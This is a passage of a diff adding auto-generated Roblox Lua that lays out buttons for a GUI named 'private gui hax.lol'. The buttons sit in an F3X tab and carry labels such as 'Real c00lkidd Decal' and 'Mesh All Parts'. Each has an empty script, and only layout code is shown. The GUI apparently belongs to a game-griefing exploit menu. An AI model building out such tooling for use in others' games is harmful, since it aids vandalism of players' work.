+G2L["137"]["Name"] = [[Button]];
+G2L["137"]["Position"] = UDim2.new(-1.35203, 0, 42.58134, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["138"] = Instance.new("LocalScript", G2L["137"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["139"] = Instance.new("TextButton", G2L["7a"]);
+G2L["139"]["TextWrapped"] = true;
+G2L["139"]["BorderSizePixel"] = 3;
+G2L["139"]["TextSize"] = 14;
+G2L["139"]["TextScaled"] = true;
+G2L["139"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["139"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["139"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["139"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["139"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["139"]["Text"] = [[Anonymous mask]];
+G2L["139"]["Name"] = [[Button]];
+G2L["139"]["Position"] = UDim2.new(-0.00466, 0, 42.55009, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["13a"] = Instance.new("LocalScript", G2L["139"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+G2L["13b"] = Instance.new("LocalScript", G2L["7a"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["13c"] = Instance.new("TextButton", G2L["7a"]);
+G2L["13c"]["TextWrapped"] = true;
+G2L["13c"]["BorderSizePixel"] = 3;
+G2L["13c"]["TextSize"] = 14;
+G2L["13c"]["TextScaled"] = true;
+G2L["13c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["13c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["13c"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["13c"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["13c"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["13c"]["Text"] = [[KaaX]];
+G2L["13c"]["Name"] = [[Button]];
+G2L["13c"]["Position"] = UDim2.new(-5.30993, 0, 44.20634, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["13d"] = Instance.new("LocalScript", G2L["13c"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["13e"] = Instance.new("TextButton", G2L["7a"]);
+G2L["13e"]["TextWrapped"] = true;
+G2L["13e"]["BorderSizePixel"] = 3;
+G2L["13e"]["TextSize"] = 14;
+G2L["13e"]["TextScaled"] = true;
+G2L["13e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["13e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["13e"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["13e"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["13e"]["BorderColor3"] = Color3.fromRGB(255, 0, 0);
+G2L["13e"]["Text"] = [[Mr krab]];
+G2L["13e"]["Name"] = [[Button]];
+G2L["13e"]["Position"] = UDim2.new(-4.02571, 0, 44.20634, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["13f"] = Instance.new("LocalScript", G2L["13e"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["140"] = Instance.new("TextButton", G2L["7a"]);
+G2L["140"]["TextWrapped"] = true;
+G2L["140"]["BorderSizePixel"] = 3;
+G2L["140"]["TextSize"] = 14;
+G2L["140"]["TextScaled"] = true;
+G2L["140"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["140"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["140"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["140"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["140"]["BorderColor3"] = Color3.fromRGB(61, 0, 255);
+G2L["140"]["Text"] = [[Krnl Logo]];
+G2L["140"]["Name"] = [[Button]];
+G2L["140"]["Position"] = UDim2.new(-2.66782, 0, 44.20634, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["141"] = Instance.new("LocalScript", G2L["140"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["142"] = Instance.new("TextButton", G2L["7a"]);
+G2L["142"]["TextWrapped"] = true;
+G2L["142"]["BorderSizePixel"] = 3;
+G2L["142"]["TextSize"] = 14;
+G2L["142"]["TextScaled"] = true;
+G2L["142"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["142"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["142"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["142"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["142"]["BorderColor3"] = Color3.fromRGB(112, 112, 112);
+G2L["142"]["Text"] = [[Goofy Business]];
+G2L["142"]["Name"] = [[Button]];
+G2L["142"]["Position"] = UDim2.new(-1.35203, 0, 44.20634, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["143"] = Instance.new("LocalScript", G2L["142"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["144"] = Instance.new("TextButton", G2L["7a"]);
+G2L["144"]["TextWrapped"] = true;
+G2L["144"]["BorderSizePixel"] = 3;
+G2L["144"]["TextSize"] = 14;
+G2L["144"]["TextScaled"] = true;
+G2L["144"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["144"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["144"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["144"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["144"]["BorderColor3"] = Color3.fromRGB(25, 162, 0);
+G2L["144"]["Text"] = [[New Team k00pkidd Logo]];
+G2L["144"]["Name"] = [[Button]];
+G2L["144"]["Position"] = UDim2.new(-0.00466, 0, 44.20634, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["145"] = Instance.new("LocalScript", G2L["144"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["146"] = Instance.new("TextButton", G2L["7a"]);
+G2L["146"]["TextWrapped"] = true;
+G2L["146"]["BorderSizePixel"] = 3;
+G2L["146"]["TextSize"] = 14;
+G2L["146"]["TextScaled"] = true;
+G2L["146"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["146"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["146"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["146"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["146"]["BorderColor3"] = Color3.fromRGB(255, 0, 0);
+G2L["146"]["Text"] = [[r0pyz]];
+G2L["146"]["Name"] = [[Button]];
+G2L["146"]["Position"] = UDim2.new(-5.30993, 0, 45.83134, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["147"] = Instance.new("LocalScript", G2L["146"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["148"] = Instance.new("TextButton", G2L["7a"]);
+G2L["148"]["TextWrapped"] = true;
+G2L["148"]["BorderSizePixel"] = 3;
+G2L["148"]["TextSize"] = 14;
+G2L["148"]["TextScaled"] = true;
+G2L["148"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["148"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["148"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["148"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["148"]["BorderColor3"] = Color3.fromRGB(255, 249, 249);
+G2L["148"]["Text"] = [[Old g00by Avatar]];
+G2L["148"]["Name"] = [[Button]];
+G2L["148"]["Position"] = UDim2.new(-4.02571, 0, 45.83134, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["149"] = Instance.new("LocalScript", G2L["148"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["14a"] = Instance.new("TextButton", G2L["7a"]);
+G2L["14a"]["TextWrapped"] = true;
+G2L["14a"]["BorderSizePixel"] = 3;
+G2L["14a"]["TextSize"] = 14;
+G2L["14a"]["TextScaled"] = true;
+G2L["14a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["14a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["14a"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["14a"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["14a"]["BorderColor3"] = Color3.fromRGB(255, 0, 0);
+G2L["14a"]["Text"] = [[Mario Exe]];
+G2L["14a"]["Name"] = [[Button]];
+G2L["14a"]["Position"] = UDim2.new(-2.66782, 0, 45.83134, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["14b"] = Instance.new("LocalScript", G2L["14a"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["14c"] = Instance.new("TextButton", G2L["7a"]);
+G2L["14c"]["TextWrapped"] = true;
+G2L["14c"]["BorderSizePixel"] = 3;
+G2L["14c"]["TextSize"] = 14;
+G2L["14c"]["TextScaled"] = true;
+G2L["14c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["14c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["14c"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["14c"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["14c"]["BorderColor3"] = Color3.fromRGB(18, 0, 255);
+G2L["14c"]["Text"] = [[The Dud]];
+G2L["14c"]["Name"] = [[Button]];
+G2L["14c"]["Position"] = UDim2.new(-1.35203, 0, 45.83134, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["14d"] = Instance.new("LocalScript", G2L["14c"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["14e"] = Instance.new("TextButton", G2L["7a"]);
+G2L["14e"]["TextWrapped"] = true;
+G2L["14e"]["BorderSizePixel"] = 3;
+G2L["14e"]["TextSize"] = 14;
+G2L["14e"]["TextScaled"] = true;
+G2L["14e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["14e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["14e"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["14e"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["14e"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["14e"]["Text"] = [[Anonymous]];
+G2L["14e"]["Name"] = [[Button]];
+G2L["14e"]["Position"] = UDim2.new(-0.00466, 0, 45.83134, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["14f"] = Instance.new("LocalScript", G2L["14e"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["150"] = Instance.new("TextButton", G2L["7a"]);
+G2L["150"]["TextWrapped"] = true;
+G2L["150"]["BorderSizePixel"] = 3;
+G2L["150"]["TextSize"] = 14;
+G2L["150"]["TextScaled"] = true;
+G2L["150"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["150"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["150"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["150"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["150"]["BorderColor3"] = Color3.fromRGB(0, 222, 255);
+G2L["150"]["Text"] = [[Jenny WakeMan]];
+G2L["150"]["Name"] = [[Button]];
+G2L["150"]["Position"] = UDim2.new(-5.32045, 0, 47.51884, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["151"] = Instance.new("LocalScript", G2L["150"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["152"] = Instance.new("TextButton", G2L["7a"]);
+G2L["152"]["TextWrapped"] = true;
+G2L["152"]["BorderSizePixel"] = 3;
+G2L["152"]["TextSize"] = 14;
+G2L["152"]["TextScaled"] = true;
+G2L["152"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["152"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["152"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["152"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["152"]["BorderColor3"] = Color3.fromRGB(252, 255, 0);
+G2L["152"]["Text"] = [[Jim Carrey Face]];
+G2L["152"]["Name"] = [[Button]];
+G2L["152"]["Position"] = UDim2.new(-4.03624, 0, 47.51884, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["153"] = Instance.new("LocalScript", G2L["152"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["154"] = Instance.new("TextButton", G2L["7a"]);
+G2L["154"]["TextWrapped"] = true;
+G2L["154"]["BorderSizePixel"] = 3;
+G2L["154"]["TextSize"] = 14;
+G2L["154"]["TextScaled"] = true;
+G2L["154"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["154"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["154"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["154"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["154"]["BorderColor3"] = Color3.fromRGB(10, 142, 0);
+G2L["154"]["Text"] = [[Shrek]];
+G2L["154"]["Name"] = [[Button]];
+G2L["154"]["Position"] = UDim2.new(-2.67835, 0, 47.51884, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["155"] = Instance.new("LocalScript", G2L["154"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["156"] = Instance.new("TextButton", G2L["7a"]);
+G2L["156"]["TextWrapped"] = true;
+G2L["156"]["BorderSizePixel"] = 3;
+G2L["156"]["TextSize"] = 14;
+G2L["156"]["TextScaled"] = true;
+G2L["156"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["156"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["156"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["156"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["156"]["BorderColor3"] = Color3.fromRGB(255, 255, 0);
+G2L["156"]["Text"] = [[Homer Simpson]];
+G2L["156"]["Name"] = [[Button]];
+G2L["156"]["Position"] = UDim2.new(-1.36256, 0, 47.51884, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["157"] = Instance.new("LocalScript", G2L["156"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["158"] = Instance.new("TextButton", G2L["7a"]);
+G2L["158"]["TextWrapped"] = true;
+G2L["158"]["BorderSizePixel"] = 3;
+G2L["158"]["TextSize"] = 14;
+G2L["158"]["TextScaled"] = true;
+G2L["158"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["158"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["158"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["158"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["158"]["BorderColor3"] = Color3.fromRGB(255, 255, 0);
+G2L["158"]["Text"] = [[Cursed Laughing Emoji]];
+G2L["158"]["Name"] = [[Button]];
+G2L["158"]["Position"] = UDim2.new(-0.00466, 0, 47.51884, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["159"] = Instance.new("LocalScript", G2L["158"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["15a"] = Instance.new("TextButton", G2L["7a"]);
+G2L["15a"]["TextWrapped"] = true;
+G2L["15a"]["BorderSizePixel"] = 3;
+G2L["15a"]["TextSize"] = 14;
+G2L["15a"]["TextScaled"] = true;
+G2L["15a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["15a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["15a"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["15a"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["15a"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["15a"]["Text"] = [[Mesh All Parts]];
+G2L["15a"]["Name"] = [[Button]];
+G2L["15a"]["Position"] = UDim2.new(-0.01519, 0, 5.51884, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["15b"] = Instance.new("LocalScript", G2L["15a"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["15c"] = Instance.new("TextButton", G2L["7a"]);
+G2L["15c"]["TextWrapped"] = true;
+G2L["15c"]["BorderSizePixel"] = 3;
+G2L["15c"]["TextSize"] = 14;
+G2L["15c"]["TextScaled"] = true;
+G2L["15c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["15c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["15c"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["15c"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["15c"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["15c"]["Text"] = [[Rick Roll Meme]];
+G2L["15c"]["Name"] = [[Button]];
+G2L["15c"]["Position"] = UDim2.new(-5.32045, 0, 49.23759, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["15d"] = Instance.new("LocalScript", G2L["15c"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["15e"] = Instance.new("TextButton", G2L["7a"]);
+G2L["15e"]["TextWrapped"] = true;
+G2L["15e"]["BorderSizePixel"] = 3;
+G2L["15e"]["TextSize"] = 14;
+G2L["15e"]["TextScaled"] = true;
+G2L["15e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["15e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["15e"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["15e"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["15e"]["BorderColor3"] = Color3.fromRGB(235, 255, 0);
+G2L["15e"]["Text"] = [[Tubers93]];
+G2L["15e"]["Name"] = [[Button]];
+G2L["15e"]["Position"] = UDim2.new(-4.02571, 0, 49.23759, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["15f"] = Instance.new("LocalScript", G2L["15e"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["160"] = Instance.new("TextButton", G2L["7a"]);
+G2L["160"]["TextWrapped"] = true;
+G2L["160"]["BorderSizePixel"] = 3;
+G2L["160"]["TextSize"] = 14;
+G2L["160"]["TextScaled"] = true;
+G2L["160"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["160"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["160"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["160"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["160"]["BorderColor3"] = Color3.fromRGB(108, 116, 0);
+G2L["160"]["Text"] = [[Krnlkid]];
+G2L["160"]["Name"] = [[Button]];
+G2L["160"]["Position"] = UDim2.new(-2.67835, 0, 49.23759, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["161"] = Instance.new("LocalScript", G2L["160"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["162"] = Instance.new("TextButton", G2L["7a"]);
+G2L["162"]["TextWrapped"] = true;
+G2L["162"]["BorderSizePixel"] = 3;
+G2L["162"]["TextSize"] = 14;
+G2L["162"]["TextScaled"] = true;
+G2L["162"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["162"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["162"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["162"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["162"]["BorderColor3"] = Color3.fromRGB(0, 56, 255);
+G2L["162"]["Text"] = [[Lua Logo]];
+G2L["162"]["Name"] = [[Button]];
+G2L["162"]["Position"] = UDim2.new(-1.36256, 0, 49.23759, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["163"] = Instance.new("LocalScript", G2L["162"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["164"] = Instance.new("TextButton", G2L["7a"]);
+G2L["164"]["TextWrapped"] = true;
+G2L["164"]["BorderSizePixel"] = 3;
+G2L["164"]["TextSize"] = 14;
+G2L["164"]["TextScaled"] = true;
+G2L["164"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["164"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["164"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["164"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["164"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["164"]["Text"] = [[RIP G00by]];
+G2L["164"]["Name"] = [[Button]];
+G2L["164"]["Position"] = UDim2.new(-0.00466, 0, 49.23759, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["165"] = Instance.new("LocalScript", G2L["164"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["166"] = Instance.new("TextButton", G2L["7a"]);
+G2L["166"]["TextWrapped"] = true;
+G2L["166"]["BorderSizePixel"] = 3;
+G2L["166"]["TextSize"] = 14;
+G2L["166"]["TextScaled"] = true;
+G2L["166"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["166"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["166"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["166"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["166"]["BorderColor3"] = Color3.fromRGB(39, 255, 0);
+G2L["166"]["Text"] = [[Cursed Baldi]];
+G2L["166"]["Name"] = [[Button]];
+G2L["166"]["Position"] = UDim2.new(-5.32045, 0, 50.98759, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["167"] = Instance.new("LocalScript", G2L["166"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["168"] = Instance.new("TextButton", G2L["7a"]);
+G2L["168"]["TextWrapped"] = true;
+G2L["168"]["BorderSizePixel"] = 3;
+G2L["168"]["TextSize"] = 14;
+G2L["168"]["TextScaled"] = true;
+G2L["168"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["168"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["168"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["168"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["168"]["BorderColor3"] = Color3.fromRGB(0, 56, 255);
+G2L["168"]["Text"] = [[LuckyMaxer]];
+G2L["168"]["Name"] = [[Button]];
+G2L["168"]["Position"] = UDim2.new(-4.03624, 0, 50.98759, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["169"] = Instance.new("LocalScript", G2L["168"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["16a"] = Instance.new("TextButton", G2L["7a"]);
+G2L["16a"]["TextWrapped"] = true;
+G2L["16a"]["BorderSizePixel"] = 3;
+G2L["16a"]["TextSize"] = 14;
+G2L["16a"]["TextScaled"] = true;
+G2L["16a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["16a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["16a"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["16a"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["16a"]["BorderColor3"] = Color3.fromRGB(117, 51, 52);
+G2L["16a"]["Text"] = [[Snoop Dogg]];
+G2L["16a"]["Name"] = [[Button]];
+G2L["16a"]["Position"] = UDim2.new(-2.66782, 0, 50.98759, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["16b"] = Instance.new("LocalScript", G2L["16a"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["16c"] = Instance.new("TextButton", G2L["7a"]);
+G2L["16c"]["TextWrapped"] = true;
+G2L["16c"]["BorderSizePixel"] = 3;
+G2L["16c"]["TextSize"] = 14;
+G2L["16c"]["TextScaled"] = true;
+G2L["16c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["16c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["16c"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["16c"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["16c"]["BorderColor3"] = Color3.fromRGB(255, 20, 20);
+G2L["16c"]["Text"] = [[Real c00lkidd Decal]];
+G2L["16c"]["Name"] = [[Button]];
+G2L["16c"]["Position"] = UDim2.new(-1.36256, 0, 50.98759, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["16d"] = Instance.new("LocalScript", G2L["16c"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["16e"] = Instance.new("TextButton", G2L["7a"]);
+G2L["16e"]["TextWrapped"] = true;
+G2L["16e"]["BorderSizePixel"] = 3;
+G2L["16e"]["TextSize"] = 14;
+G2L["16e"]["TextScaled"] = true;
+G2L["16e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["16e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["16e"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
